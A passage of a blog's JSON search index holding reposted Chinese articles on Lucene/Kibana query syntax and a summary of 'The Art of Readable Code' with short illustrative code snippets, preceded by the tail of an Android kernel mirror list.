https://android.googlesource.com/kernel/omap.git https://aosp.tuna.tsinghua.edu.cn/kernel/omap.git samsung https://android.googlesource.com/kernel/samsung.git https://aosp.tuna.tsinghua.edu.cn/kernel/samsung.git tegra https://android.googlesource.com/kernel/tegra.git https://aosp.tuna.tsinghua.edu.cn/kernel/tegra.git x86_64 https://android.googlesource.com/kernel/x86_64.git https://aosp.tuna.tsinghua.edu.cn/kernel/x86_64.git msm https://android.googlesource.com/kernel/msm.git https://aosp.tuna.tsinghua.edu.cn/kernel/msm.git","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"lucene(Kibana)搜索规则","slug":"lucene-Kibana-搜索规则","date":"2017-12-29T07:38:40.000Z","updated":"2020-05-11T07:23:44.780Z","comments":true,"path":"2017/12/29/lucene-Kibana-搜索规则/","link":"","permalink":"https://superxlcr.github.io/2017/12/29/lucene-Kibana-搜索规则/","excerpt":"","text":"本文转载自：http://blog.csdn.net/lwwgtm/article/details/60353812 kibanna用的是lucene的搜索规则 Lucene所支持的查询语法可见http://lucene.apache.org/java/3_0_1/queryparsersyntax.html 语法关键字 &amp;&amp; || ! ( ) { } [ ] ^ “ ~ x ? : \\ 如果所要查询的查询词中本身包含关键字，则需要用\\进行转义 查询词(Term)Lucene支持两种查询词，一种是单一查询词，如”hello”，一种是词组(phrase)，如”hello world”。 查询域(Field)在查询语句中，可以指定从哪个域中寻找查询词，如果不指定，则从默认域中查找。 查询域和查询词之间用:分隔，如title:”Do it right”。 :仅对紧跟其后的查询词起作用，如果title:Do it right，则仅表示在title中查询Do，而it right要在默认域中查询。 通配符查询(Wildcard)支持两种通配符：?表示一个字符，x表示多个字符。 通配符可以出现在查询词的中间或者末尾，如te?t，testx，text，但决不能出现在开始，如xtest，?test。 模糊查询(Fuzzy)模糊查询的算法是基于Levenshtein Distance，也即当两个词的差别小于某个比例的时候，就算匹配，如roam~0.8，即表示差别小于0.2，相似度大于0.8才算匹配。 临近查询(Proximity)在词组后面跟随~10，表示词组中的多个词之间的距离之和不超过10，则满足查询。 所谓词之间的距离，即查询词组中词为满足和目标词组相同的最小移动次数。 如索引中有词组”apple boy cat”。 如果查询词为”apple boy cat”~0，则匹配。 如果查询词为”boy apple cat”~2，距离设为2方能匹配，设为1则不能匹配。 (0) boy apple cat (1) boyapple cat (2) apple boy cat 如果查询词为”cat boy apple”~4，距离设为4方能匹配。 (0) cat boy apple (1) catboy apple (2) boy catapple (3) boyapple cat (4) apple boy cat 区间查询(Range)区间查询包含两种，一种是包含边界，用[A TO B]指定，一种是不包含边界，用{A TO B}指定。 如date:[20020101 TO 20030101]，当然区间查询不仅仅用于时间，如title:{Aida TO Carmen} 增加一个查询词的权重(Boost)可以在查询词后面加^N来设定此查询词的权重，默认是1，如果N大于1，则说明此查询词更重要，如果N小于1，则说明此查询词更不重要。 如jakarta^4 apache，”jakarta apache”^4 “Apache Lucene” 布尔操作符布尔操作符包括连接符，如AND，OR，和修饰符，如NOT，+，-。 默认状态下，空格被认为是OR的关系，QueryParser.setDefaultOperator(Operator.AND)设置为空格为AND。 +表示一个查询语句是必须满足的(required)，NOT和-表示一个查询语句是不能满足的(prohibited)。 组合可以用括号，将查询语句进行组合，从而设定优先级。 如(jakarta OR apache) AND website Lucene的查询语法是由QueryParser来进行解析，从而生成查询对象的。 通过编译原理我们知道，解析一个语法表达式，需要经过词法分析和语法分析的过程，也即需要词法分析器和语法分析器。 QueryParser是通过JavaCC来生成词法分析器和语法分析器的。","categories":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/categories/杂项/"}],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/tags/杂项/"}]},{"title":"如何提高代码的可读性? - 读《编写可读代码的艺术》","slug":"如何提高代码的可读性-读《编写可读代码的艺术》","date":"2017-12-26T12:11:46.000Z","updated":"2020-05-11T07:23:44.841Z","comments":true,"path":"2017/12/26/如何提高代码的可读性-读《编写可读代码的艺术》/","link":"","permalink":"https://superxlcr.github.io/2017/12/26/如何提高代码的可读性-读《编写可读代码的艺术》/","excerpt":"","text":"本文转载自：https://juejin.im/post/5a0921c05188252ae93a7014 为什么读这本书很多同行在编写代码的时候往往只关注一些宏观上的主题：架构，设计模式，数据结构等等，却忽视了一些更细节上的点：比如变量如何命名与使用，控制流的设计，以及注释的写法等等。以上这些细节上的东西可以用代码的可读性来概括。不同于宏观上的架构，设计模式等需要好几个类，好几个模块才能看出来：代码的可读性是能够立刻从微观上的，一个变量的命名，函数的逻辑划分，注释的信息质量里面看出来的。宏观层面上的东西固然重要，但是代码的可读性也属于评价代码质量的一个无法让人忽视的指标：它影响了阅读代码的成本（毕竟代码注意是给人看的），甚至会影响代码出错的概率！这里引用《编写可读代码的艺术》这本书里的一句话: 对于一个整体的软件系统而言，既需要宏观的架构决策，设计与指导原则，也必须重视微观上的的代码细节。在软件历史中，有许多影响深远的重大失败，其根源往往是编码细节出现了疏漏。 因此笔者认为代码的可读性可以作为考量一名程序员专业程度的指标。或许已经有很多同行也正在努力提高自己代码的可读性。然而这里有一个很典型的错觉（笔者之前就有这种错觉）是：越少的代码越容易让人理解。但是事实上，并不是代码越精简就越容易让人理解。相对于追求最小化代码行数，一个更好的提高可读性方法是最小化人们理解代码所需要的时间。这就引出了这本中的一个核心定理： 可读性基本定理：代码的写法应当使别人理解它所需要的时间最小化。 这本书讲的就是关于”如何提高代码的可读性“。 总结下来，这本书从浅入深，在三个层次告诉了我们如何让代码易于理解： 表层上的改进：在命名方法（变量名，方法名），变量声明，代码格式，注释等方面的改进。 控制流和逻辑的改进：在控制流，逻辑表达式上让代码变得更容易理解。 结构上的改进：善于抽取逻辑，借助自然语言的描述来改善代码。 表层的改进首先来讲最近简单的一层如何改进，涉及到以下几点： 如何命名 如何声明与使用变量 如何简化表达式 如何让代码具有美感 如何写注释 如何命名关于如何命名，作者提出了一个关键思想： 关键思想：把尽可能多的信息装入名字中。 这里的多指的是有价值的多。那么如何做到有价值呢？作者介绍了以下几个建议： 选择专业的词汇，避免泛泛的名字 给名字附带更多信息 决定名字最适合的长度 名字不能引起歧义 选择专业的词汇，避免泛泛的名字一个比较常见的反例：get。 get这个词最好是用来做轻量级的取方法的开头，而如果用到其他的地方就会显得很不专业。举个书中的例子： getPage(url)通过这个方法名很难判断出这个方法是从缓存中获取页面数据还是从网页中获取。如果是从网页中获取，更专业的词应该是fetchPage(url)或者downloadPage(url)。还有一个比较常见的反例：returnValue和retval。这两者都是“返回值”的意思，他们被滥用在各个有返回值的函数里面。其实这两个次除了携带他们本来的意思返回值以外并不具备任何其他的信息，是典型的泛泛的名字。那么如何选择一个专业的词汇呢？答案是在非常贴近你自己的意图的基础上，选择一个富有表现力的词汇。举几个例子： 相对于make，选择create,generate,build等词汇会更有表现力，更加专业。 相对于find，选择search,extract,recover等词汇会更有表现力，更加专业。 相对于retval，选择一个能充分描述这个返回值的性质的名字，例如： 123456var euclidean_norm = function (v)&#123; var retval = 0.0; for (var i = 0; i &lt; v.length; i += 1;) retval += v[i] * v[i]; return Match.sqrt(retval);&#125; 这里的retval表示的是“平方的和”，因此sum_squares这个词更加贴切你的意图，更加专业。但是，有些情况下，泛泛的名字也是有意义的，例如一个交换变量的情景： 12345if (right &lt; left)&#123; tmp = right; right = left; left = tmp;&#125; 像上面这种tmp只是作为一个临时存储的情况下，tmp表达的意思就比较贴切了。因此，像tmp这个名字，只适用于短期存在而且特性为临时性的变量。 给名字附带更多信息除了选择一个专业，贴切意图的词汇，我们也可以通过添加一些前后缀来给这个词附带更多的信息。这里所指的更多的信息有三种： 变量的单位 变量的属性 变量的格式 为变量添加单位有些变量是有单位的，在变量名的后面添加其单位可以让这个变量名携带更多信息： 一个表达时间间隔的变量，它的单位是秒：相对于duraction，ducation_secs携带了更多的信息 一个表达内存大小的变量，它的单位是mb：相对于size，cache_mb携带了更多的信息。 为变量添加重要属性有些变量是具有一些非常重要的属性，其重要程度是不允许使用者忽略的。例如： 一个UTF-8格式的html字节，相对于html，html_utf8更加清楚地描述了这个变量的格式。 一个纯文本，需要加密的密码字符串：相对于password，plaintext_password更清楚地描述了这个变量的特点。 为变量选择适当的格式对于命名，有些既定的格式需要注意： 使用大驼峰命名来表示类名：HomeViewController。 使用小驼峰命名来表示属性名：userNameLabel。 使用下划线连接词来表示变量名：product_id。 使用kConstantName来表示常量：kCacheDuraction。 使用MACRO_NAME来表示宏：SCREEN_WIDTH。 决定名字最适合的长度名字越长越难记住，名字越短所持有的信息就越少，如何决定名字的长度呢？这里有几个原则： 如果变量的作用域很小，可以取很短的名字 驼峰命名中的单元不能超过3个 不能使用大家不熟悉的缩写 丢掉不必要的单元 如果变量的作用域很小，可以取很短的名字如果一个变量作用域很小：则可以给它取一个很短的名字也无妨。看下面这个例子： 12345if(debug)&#123; map &lt;string,int&gt;m; LookUpNamesNumbers(&amp;m); Print(m);&#125; 在这里，变量的类型和使用范围一眼可见，读者可以了解这段代码的所有信息，所以即使是取m这个非常简短的名字，也不影响读者来理解作者的意图。相反的，如果m是一个全局变量，当你看到下面这段代码就会很头疼，因为你不知道它的类型并不明确: 12LookUpNamesNumbers(&amp;m);Print(m); 驼峰命名中的单元不能超过3个我们知道驼峰命名可以很清晰地体现变量的含义，但是当驼峰命名中的单元超过了3个之后，就会很影响阅读体验: 1userFriendsInfoModel 1memoryCacheCalculateTool 是不是看上去很吃力？因为我们大脑同时可以记住的信息非常有限，尤其是在看代码的时候，这种短期记忆的局限性是无法让我们同时记住或者瞬间理解几个具有3~4个单元的变量名的。所以我们需要在变量名里面去除一些不必要的单元： 丢掉不必要的单元有些单元在变量里面是可以去掉的，例如： convertToString可以省略成toString。 不能使用大家不熟悉的缩写有些缩写是大家熟知的： doc可以代替document str可以代替string但是如果你想用BEManager来代替BackEndManager就比较不合适了。因为不了解的人几乎是无法猜到这个名称的意义的。 所以类似这种情况不能偷懒，该是什么就是什么，否则会起到相反的效果。因为它看起来非常陌生，跟我们熟知的一些缩写规则相去甚远。 名字不能引起歧义有些名字会引起歧义，例如： filter：过滤这个词，可以是过滤出符合标准的，也可以是减少不符合标准的：是两种完全相反的结果，所以不推荐使用。 clip：类似的，到底是在原来的基础上截掉某一段还是另外截出来某一段呢？同样也不推荐使用。 布尔值：read_password:是表达需要读取密码，还是已经读了密码呢？所以最好使用need_password或者is_authenticated来代替比较好。通常来说，给布尔值的变量加上is,has,can,should这样的词可以使布尔值表达的意思更加明确 这一节讲了很多关于如何起好一个变量名的方法。其实有一个很简单的原则来判断这个变量名起的是否是好的：那就是：团队的新成员是否能迅速理解这个变量名的含义。如果是，那么这个命名就是成功的，否则就不要偷懒了，起个好名字，对谁都好。其实如果你养成习惯多花几秒钟想出个好名字，你会发现你的“命名能力”会很快提升。 如何声明与使用变量在写程序的过程中我们会声明很多变量（成员变量，临时变量），而我们要知道变量的声明与使用策略是会对代码的可读性造成影响的： 变量越多，越难跟踪它们的动向。 变量的作用域越大，就需要跟踪它们的动向越久。 变量改变的越频繁，就越难跟踪它的当前值。 相对的，对于变量的声明与使用，我们可以从这四个角度来提高代码的可读性： 减少变量的个数 缩小变量的作用域 缩短变量声明与使用其代码的距离 变量最好只写一次 减少变量的个数在一个函数里面可能会声明很多变量，但是有些变量的声明是毫无意义的，比如： 没有价值的临时变量 表示中间结果的变量 没有价值的临时变量有些变量的声明完全是多此一举，它们的存在反而加大了阅读代码的成本： 12let now = datetime.datatime.now()root_message.last_view_time = now 上面这个now变量的存在是毫无意义的，因为： 没有拆分任何复杂的表达式 datetime.datatime.now已经很清楚地表达了意思 只使用了一次，因此而没有压缩任何冗余的代码 所以完全不用这个变量也是完全可以的： 1root_message.last_view_time = datetime.datatime.now() 表示中间结果的变量有的时候为了达成一个目标，把一件事情分成了两件事情来做，这两件事情中间需要一个变量来传递结果。但往往这件事情不需要分成两件事情来做，这个“中间结果”也就不需要了：看一个比较常见的需求，一个把数组中的某个值移除的例子： 123456789101112var remove_value = function (array, value_to_remove)&#123; var index_to_remove = null; for (var i = 0; i &lt; array.length; i+=1)&#123; if (array[i] === value_to_remove)&#123; index_to_remove = i; break; &#125; &#125; if (index_to_remove !== null)&#123; array.splice(index_to_remove,1); &#125;&#125; 这里面把这个事情分成了两件事情来做： 找出要删除的元素的序号，保存在变量index_to_remove里面。 拿到index_to_remove以后使用splice方法删除它。（这段代码是JavaScript代码） 这个例子对于变量的命名还是比较合格的，但实际上这里所使用的中间结果变量是完全不需要的，整个过程也不需要分两个步骤进行。来看一下如何一步实现这个需求： 12345678var remove_value = function (array, value_to_remove)&#123; for (var i = 0; i &lt; array.length; i+=1)&#123; if (array[i] === value_to_remove)&#123; array.splice(i,1); return; &#125; &#125;&#125; 上面的方法里面，当知道应该删除的元素的序号i的时候，就直接用它来删除了应该删除的元素并立即返回。除了减轻了内存和处理器的负担（因为不需要开辟新的内容来存储结果变量以及可能不用完全走遍整个的for语句），阅读代码的人也会很快领会代码的意图。所以在写代码的时候，如果可以“速战速决”，就尽量使用最快，最简洁的方式来实现目的。 缩小变量的作用域变量的作用域越广，就越难追踪它，值也越难控制，所以我们应该让你的变量对尽量少的代码可见。比如类的成员变量就相当于一个“小型局部变量”。如果这个类比较庞大，我们就会很难追踪它，因为所有方法都可以“隐式”调用它。所以相反地，如果我们可以把它“降格”为局部变量，就会很容易追踪它的行踪： 12345678910111213//成员变量，比较难追踪class LargeCass&#123; string str_; void Method1()&#123; str_ = ...; Method2(); &#125; void Method2()&#123; //using str_ &#125;&#125; 降格： 123456789101112//局部变量，容易追踪class LargeCass&#123; void Method1()&#123; string str = ...; Method2(str); &#125; void Method2(string str)&#123; //using str &#125;&#125; 所以在设计类的时候如果这个数据（变量）可以通过方法参数来传递，就不要以成员变量来保存它。 缩短变量声明与使用其代码的距离在实现一个函数的时候，我们可能会声明比较多的变量，但这些变量的使用位置却不都是在函数开头。有一个比较不好的习惯就是无论变量在当前函数的哪个位置使用，都在一开始（函数的开头）就声明了它们。这样可能导致的问题是：阅读代码的人读到函数后半部分的时候就忘记了这个变量的类型和初始值；而且因为在函数的开头就声明了好几个变量，也对阅读代码的人的大脑造成了负担，因为人的短期记忆是有限的，特别是记一些暂时还不知道怎么用的东西。因此，如果在函数内部需要在不同地方使用几个不同的变量，建议在真正使用它们之前再声明它。 变量最好只写一次操作一个变量的地方越多，就越难确定它的当前值。所以在很多语言里面有其各自的方式让一些变量不可变（是个常量），比如C++里的const和Java中的final。 如何简化表达式有些表达式比较长，很难让人马上理解。这时候最好可以将其拆分成更容易的几个小块。可以尝试下面的几个方法： 使用解释变量 使用总结变量 使用德摩根定理 使用解释变量有些变量会从一个比较长的算式得出，这个表达式可能很难让人看懂。这时候就需要用一个简短的“解释”变量来诠释算式的含义。使用书中的一个例子： 1if line.split(':')[0].strip() == \"root\" 其实上面左侧的表达式其实得出的是用户名，我们可以用username来替换它： 12username = line.split(':')[0].strip()if username == \"root\" 使用总结变量除了以“变量”替换“算式”，还可以用“变量”来替换含有更多变量更复杂的内容，比如条件语句，这时候该变量可以被称为”总结变量”。使用书中的一个例子： 123if(request.user.id == document.owner_id)&#123; //do something &#125; 上面这条判断语句所判断的是：“该文档的所有者是不是该用户”。我们可以使用一个总结性的变量user_owns_document来替换它： 1234final boolean user_owns_document = (request.user.id == document.owner_id);if (user_owns_document)&#123; //do something&#125; 使用德摩根定理德摩根定理: not(a or b or c)等价于(not a) and (not b) and (not c) not(a and b and c)等价于(not a) or (not b) or (not c) 当我们条件语句里面存在外部取反的情况，就可以使用德摩根定理来做个转换。使用书中的一个例子： 12345//使用德摩根定理转换以前if(!(file_exists &amp;&amp; !is_protected))&#123;&#125;//使用德摩根定理转换以后if(!file_exists || is_protected)&#123;&#125; 如何让代码具有美感在读过一些好的源码之后我有一个感受：好的源码往往都看上去都很漂亮，很有美感。这里说的漂亮和美感不是指代码的逻辑清晰有条理，而是指感官上的视觉感受让人感觉很舒服。这是从一种纯粹的审美的角度来评价代码的：富有美感的代码让人赏心悦目，也容易让人读懂。为了让代码更有美感，采取以下实践会很有帮助： 用换行和列对齐来让代码更加整齐 选择一个有意义的顺序 把代码分成”段落” 保持风格一致性 用换行和列对齐来让代码更加整齐有些时候，我们可以利用换行和列对齐来让代码显得更加整齐。 换行换行比较常用在函数或方法的参数比较多的时候。使用换行： 1234567- (void)requestWithUrl:(NSString*)url method:(NSString*)method params:(NSDictionary *)params success:(SuccessBlock)success failure:(FailuireBlock)failure&#123;&#125; 不使用换行： 123- (void)requestWithUrl:(NSString*)url method:(NSString*)method params:(NSDictionary *)params success:(SuccessBlock)success failure:(FailuireBlock)failure&#123;&#125; 通过比较可以看出，如果不使用换行，就很难一眼看清楚都是用了什么参数，而且代码整体看上去整洁干净了很多。 列对齐在声明一组变量的时候，由于每个变量名的长度不同，导致了在变量名左侧对齐的情况下，等号以及右侧的内容没有对齐： 123NSString *name = userInfo[@&quot;name&quot;];NSString *sex = userInfo[@&quot;sex&quot;];NSString *address = userInfo[@&quot;address&quot;]; 而如果使用了列对齐的方法，让等号以及右侧的部分对齐的方式会使代码看上去更加整洁： 123NSString *name = userInfo[@&quot;name&quot;];NSString *sex = userInfo[@&quot;sex&quot;];NSString *address = userInfo[@&quot;address&quot;]; 这二者的区别在条目数比较多以及变量名称长度相差较大的时候会更加明显。 选择一个有意义的顺序当涉及到相同变量（属性）组合的存取都存在的时候，最好以一个有意义的顺序来排列它们： 让变量的顺序与对应的HTML表单中字段的顺序相匹配 从最重要到最不重要排序 按照字母排序 举个例子：相同集合里的元素同时出现的时候最好保证每个元素出现顺序是一致的。除了便于阅读这个好处以外，也有助于能发现漏掉的部分，尤其当元素很多的时候： 1234567891011//给model赋值model.name = dict[&quot;name&quot;]；model.sex = dict[&quot;sex&quot;]；model.address = dict[&quot;address&quot;]； ...//拿到model来绘制UInameLabel.text = model.name;sexLabel.text = model.sex;addressLabel.text = model.address; 把代码分成”段落”在写文章的时候，为了能让整个文章看起来结构清晰，我们通常会把大段文字分成一个个小的段落，让表达相同主旨的语言凑到一起，与其他主旨的内容分隔开来。而且除了让读者明确哪些内容是表达同一主旨之外，把文章分为一个个段落的好处还有便于找到你的阅读”脚印“，便于段落之间的导航；也可以让你的阅读具有一定的节奏感。其实这些道理同样适用于写代码：如果你可以把一个拥有好几个步骤的大段函数，以空行+注释的方法将每一个步骤区分开来，那么则会对读者理解该函数的功能有极大的帮助。这样一来，代码既能有一定的美感，也具备了可读性。其实可读性又何尝不是来自于规则，富有美感的代码呢？ 123456789101112BigFunction&#123; //step1:***** .... //step2:***** ... //step3:***** ....&#125; 保持风格一致性有些时候，你的某些代码风格可能与大众比较容易接受的风格不太一样。但是如果你在你自己所写的代码各处能够保持你这种独有的风格，也是可以对代码的可读性有积极的帮助的。比如一个比较经典的代码风格问题： 123if(condition)&#123;&#125; or: 1234if(condition)&#123;&#125; 对于上面的两种写法，每个人对条件判断右侧的大括号的位置会有不同的看法。但是无论你坚持的是哪一个，请在你的代码里做到始终如一。因为如果有某几个特例的话，是非常影响代码的阅读体验的。我们要知道，一个逻辑清晰的代码也可以因为留白的不规则，格式不对齐，顺序混乱而让人很难读懂，这是十分让人痛心的事情。所以既然你的代码在命名上，逻辑上已经很优秀了，就不妨再费一点功夫把她打扮的漂漂亮亮的吧！ 如何写注释首先引用书中的一句话： 注释的目的是尽量帮助读者了解得和作者一样多。 在你写代码的时候，在脑海中可能会留下一些代码里面很难体现出来的部分：这些部分在别人读你的代码的时候可能很难体会到。而这些“不对称”的信息就是需要通过以注释的方式来告诉阅读代码的人。想要写出好的注释，就需要首先知道： 什么不能作为注释 什么应该作为注释 什么不能作为注释我们都知道注释占用了代码的空间，而且实际上对程序本身的运行毫无帮助，所以最好保证它是物有所值的。不幸的是，有一些注释是毫无价值的，它无情的占用了代码间的空间，影响了阅读代码的人的阅读效率，也浪费了写注释的人的时间。这样的注释有以下两种： 描述能立刻从代码自身就能立刻理解的代码意图的注释 给不好的命名添加的注释 描述能立刻从代码自身就能立刻理解的代码意图的注释12//add params1 and params2 and return sum of them- (int)addParam1:(int)param1 param2:(int)param2 上面这个例子举的比较简单，但反映的问题很明显：这里面的注释是完全不需要的，它的存在反而增加了阅读代码的人的工作量。因为他从方法名就可以马上意会到这个函数的作用了。 给不好的命名添加的注释12//get information from internet- (NSString *)getInformation 该函数返回的是从网络获取的信息。但这里使用了get前缀，无法看出信息的来源。为了补充信息，使用注释来弥补。但其实这完全不必要。只要取一个适当的名字就好了： 1- (NSString *)fetchInformation 讲完了注释不应该是什么内容，现在讲一下注释应该是什么样的内容： 什么应该作为注释本书中介绍的注释大概有以下几种： 写代码时的思考 对代码的评价 常量 全局观的概述​ 写代码时的思考你的代码可能不是一蹴而就的，它的产生可能会需要一些思考的过程。然而很多时候代码本身却无法将这些思考表达出来，所以你就可能有必要通过注释的方式来呈现你的思考，让阅读代码的人知道这段代码是哪些思考的结晶，从而也让读者理解了这段代码为什么这么写。如果遇到了比你高明的高手，在他看到你的注释之后兴许会马上设计出一套更加合适的方案。 对代码的评价有些时候你知道你现在写的代码是个临时的方案：它可能确实是解决当前问题的一个方法，但是： 你知道同时它也存在着某些缺陷，甚至是陷阱 你不知道有其他的方案可以替代了 你知道有哪个方案可以替代但是由于时间的关系或者自身的能力无法实现​ 也可能你知道你现在实现的这个方案几乎就是”完美的“，因为如果使用了其他的方案，可能会消耗更多的资源等等。对于上面这些情况，你都有必要写上几个字作为注释来诚实的告诉阅读你的这段代码的人这段代码的情况，比如： 123//该方案有一个很容易忽略的陷阱：****//该方案是存在性能瓶颈，性能瓶颈在其中的**函数中//该方案的性能可能并不是最好的，因为如果使用某某算法的话可能会好很多 常量在定义常量的时候，在其后面最好添加一个关于它是什么或者为什么它是这个值的原因。因为常量通常是不应该被修改的，所以最好把这个常量为什么是这个值说明一下：例如： 12image_quality = 0.72 // 最佳的size/quanlity比率retry_limit = 4 // 服务器性能所允许的请求失败的重试上限 全局观的概述对于一个刚加入团队的新人来说，除了团队文化，代码规范以外，可能最需要了解的是当前被分配到的项目的一些“全局观”的认识：比如组织架构，类与类之间如何交互，数据如何保存，如何流动，以及模块的入口点等等。有时仅仅添加了几句话，可能就会让新人迅速地了解当前系统或者当前类的结构以及作用，而且这些也同样对开发过当前系统的人员迅速回忆出之前开发的细节有很大帮助。这些注释可以在一个类的开头（介绍这个类的职责，以及在整个系统中的角色）也可以在一个模块入口处。书中举了一个关于这种注释的例子： 1//这个文件包含了一些辅助函数，尾门的文件系统提供了更便利的接口 再举一个iOS开发里众所周知的网络框架AFNetworking的例子。在AFHTTPSessionManager的头文件里说明了这个类的职责： 1//AFHTTPSessionManager` is a subclass of `AFURLSessionManager` with convenience methods for making HTTP requests. When a `baseURL` is provided, requests made with the `GET` / `POST` / et al. convenience methods can be made with relative paths 在知道了什么不应该是注释以及什么应该是注释以后，我们来看一下一个真正合格的注释应该是什么样子的： 注释应当有很高的信息/空间率 也就是说，注释应该用最简短的话来最明确地表达。要做到这一点需要做的努力是： 让注释保持紧凑：尽量用最简洁的话来表达，不应该有重复的内容 准确地描述函数的行为：要把函数的具体行为准确表达出来，不能停留在表明 用输入/输出的例子来说明特别的情况：有时相对于文字，可能用一个实际的参数和返回值就能立刻体现出函数的作用。而且有些特殊情况也可以通过这个方式来提醒阅读代码的人 声明代码的意图：也就是说明这段代码存在的意义，你为什么当时是这么写的原因 其实好的代码是自解释的，由于其命名的合理以及架构的清晰，几乎不需要注释来向阅读代码的人添加额外的信息，书中有一个公式可以很形象地表明一个好的代码本身的重要性： 好代码 &gt; (坏代码 + 注释) 控制流和逻辑的改进控制流在编码中占据着很重要的位置，它往往代表着一些核心逻辑和算法。因此，如果我们可以让控制流变得看上去更加“自然”，那么就会对阅读代码的人理解这些逻辑甚至是整个系统提供很大的帮助。那么都有哪相关实践呢？ 使用符合人类自然语言的表达习惯 if/else语句块的顺序 使用return提前返回 使用符合人类自然语言的表达习惯写代码也是一个表达的过程，虽然表现形式不同，但是如果我们能够采用符合人类自然语言习惯的表达习惯来写代码，对阅读代码的人理解我们的代码是很有帮助的。这里有两个比较典型的情景： 条件语句中参数的顺序 条件语句中的正负逻辑 条件语句中参数的顺序：首先比较一下下面两段代码，哪一个更容易读懂？ 12345//code 1if(length &gt; 10)//code 2if(10 &lt; length) 大家习惯上应该会觉得code1容易读懂。再来看下面一个例子： 12345//code 3if(received_number &lt; standard_number) //code 4if( standard_number&lt; received_number) 仔细看会发现，和上面那一组情况类似，大多数人还是会觉得code3更容易读懂。那么code1 和 code3有什么共性呢？它们的共性就是：左侧都是被询问的内容（通常是一个变量）；右侧都是用来做比较的内容（通常是一个常量）这应该是符合自然语言的一个顺序。比如我们一般会说“今天的气温大于20摄氏度”，而不习惯说“20摄氏度小于今天的气温”。 条件语句中的正负逻辑：在判断一些正负逻辑的时候，建议使用if(result)而不是if(!result)。因为大脑比较容易处理正逻辑，比如我们可能比较习惯说“某某某是个男人”，而不习惯说“某某某不是个女人”。如果我们使用了负逻辑，大脑还要对它进行取反，相当于多做了一次处理。 if/else语句块的顺序在写if/else语句的时候，可能会有很多不同的互斥情况（好多个elseif）。那么这些互斥的情况可以遵循哪些顺序呢？ 先处理掉简单的情况，后处理复杂的情况：这样有助于阅读代码的人循序渐进地地理解你的逻辑，而不是一开始就吃掉一个胖子，耗费不少精力。 先处理特殊或者可疑的情况，后处理正常的情况：这样有助于阅读代码的人会马上看到当前逻辑的边界条件以及需要注意的地方。 使用return提前返回在一个函数或是方法里，可能有一些情况是比较特殊或者极端的，对结果的产生影响很大（甚至是终止继续进行）。如果存在这些情况，我们应该把他们写在前面，用return来提前返回（或者返回需要返回的返回值）。这样做的好处是可以减少if/else语句的嵌套，也可以明确体现出：“哪些情况是引起异常的”。再举一个JSONModel里的例子，在initWithDictionary:error方法里面就有很多return操作，它们都体现出了“在什么情况下是不能成功将字典转化为model对象”的；而且在方法的最后返回了对象，说明如果到了这一步，则在转化的过程中通过了层层考验： 1234567891011121314151617181920212223242526272829303132333435363738394041-(id)initWithDictionary:(NSDictionary*)dict error:(NSError**)err&#123; //check for nil input if (!dict) &#123; if (err) *err = [JSONModelError errorInputIsNil]; return nil; &#125; //invalid input, just create empty instance if (![dict isKindOfClass:[NSDictionary class]]) &#123; if (err) *err = [JSONModelError errorInvalidDataWithMessage:@&quot;Attempt to initialize JSONModel object using initWithDictionary:error: but the dictionary parameter was not an &apos;NSDictionary&apos;.&quot;]; return nil; &#125; //create a class instance self = [self init]; if (!self) &#123; //super init didn&apos;t succeed if (err) *err = [JSONModelError errorModelIsInvalid]; return nil; &#125; //check incoming data structure if (![self __doesDictionary:dict matchModelWithKeyMapper:self.__keyMapper error:err]) &#123; return nil; &#125; //import the data from a dictionary if (![self __importDictionary:dict withKeyMapper:self.__keyMapper validation:YES error:err]) &#123; return nil; &#125; //run any custom model validation if (![self validate:err]) &#123; return nil; &#125; //model is valid! yay! return self;&#125; 代码组织的改进关于代码组织的改进，作者介绍了以下三种方法: 抽取出与程序主要目的“不相关的子逻辑” 重新组织代码使它一次只做一件事情 借助自然语言描述来将想法变成代码 抽取出与程序主要目的“不相关的子逻辑”一个函数里面往往包含了其主逻辑与子逻辑，我们应该积极地发现并抽取出与主逻辑不相关的子逻辑。具体思考的步骤是： 首先确认这段代码的高层次目标是什么（主要目标）？ 对于每一行代码，都要反思一下：“它是直接为了目标而工作么？” 如果答案是肯定的并且这些代码占据着一定数量的行数，我们就应该将他们抽取到独立的函数中。 比如某个函数的目标是为了寻找距离某个商家最近的地铁口，那么这其中一定会重复出现一些计算两组经纬度之间距离的子逻辑。但是这些子逻辑的具体实现是不应该出现在这个主函数里面的，因为这些细节与这个主函数的目标来讲应该是无关的。即是说，像这种类似于工具方法的函数其实是脱离于某个具体的需求的：它可以用在其他的主函数中，也可以放在其他的项目里面。比如找到离运动场场最近的几个公交站这个需求等等。而像这种“抽取子逻辑或工具方法”的做法有什么好处呢？ 提高了代码的可读性：将函数的调用与原来复杂的实现进行替换，让阅读代码的人很快能了解到该子逻辑的目的，让他们把注意力放在更高层的主逻辑上，而不会被子逻辑的实现（往往是复杂无味的）所影响。 便于修改和调试：因为一个项目中可能会多次调用该子逻辑（计算距离，计算汇率，保留小数点），当业务需求发生改变的时候只需要改变这一处就可以了，而且调试起来也非常容易。 便于测试：同理，也是因为可以被多次调用，在进行测试的时候就比较有针对性。 从函数扩大到项目，其实在一个项目里面，有很多东西不是当前这个项目所专有的，它们是可以用在其他项目中的一些“通用代码”。这些通用代码可以对当前的项目一无所知，可以被用在其他任何项目中去。我们可以养成这个习惯，“把一般代码与项目专有代码分开”，并不断扩大我们的通用代码库来解决更多的一般性问题。 重新组织代码使它一次只做一件事情一个比较大的函数或者功能可能由很多任务代码组合而来，在这个时候我们有必要将他们分为更小的函数来调用它们。这样做的好处是：我们可以清晰地看到这个功能是如何一步一步完成的，而且拆分出来的小的函数或许也可以用在其他的地方。所以如果你遇到了比较难读懂的代码，可以尝试将它所做的所有任务列出来。可能马上你就会发现这其中有些任务可以转化成单独的函数或者类。而其他的部分可以简单的成为函数中的一个逻辑段落。 借助自然语言描述来将想法变成代码在设计一个解决方案之前，如果你能够用自然语言把问题说清楚会对整个设计非常有帮助。因为如果直接从大脑中的想法转化为代码，可能会露掉一些东西。但是如果你可以将整个问题和想法滴水不漏地说出来，就可能会发现一些之前没有想到的问题。这样可以不断完善你的思路和设计。 